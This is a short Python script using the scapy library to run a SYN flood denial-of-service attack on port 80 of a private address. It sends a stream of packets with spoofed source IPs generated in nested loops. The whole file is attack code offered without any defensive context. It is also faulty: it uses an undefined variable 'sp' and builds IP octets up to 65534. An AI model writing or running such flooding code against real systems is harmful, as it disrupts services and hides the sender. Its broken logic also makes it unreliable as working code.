from scapy.all import *

def syn_flood(packet):
	sendp(packet)

eth=Ether()
ip=IP()
ip.dst='192.168.0.147'
tcp=TCP()

packet=eth/ip/tcp
tcp.dport=80

m=0

for i in range(1,255):
	for j in range(1,255):
		for k in range(1,255):
			for l in range(1,65535):
				ip.src=str(i)+'.'+str(j)+'.'+str(k)+'.'+str(l)
				tcp.sport=sp
				syn_flood(packet)
				print('send 1')
				m = m+1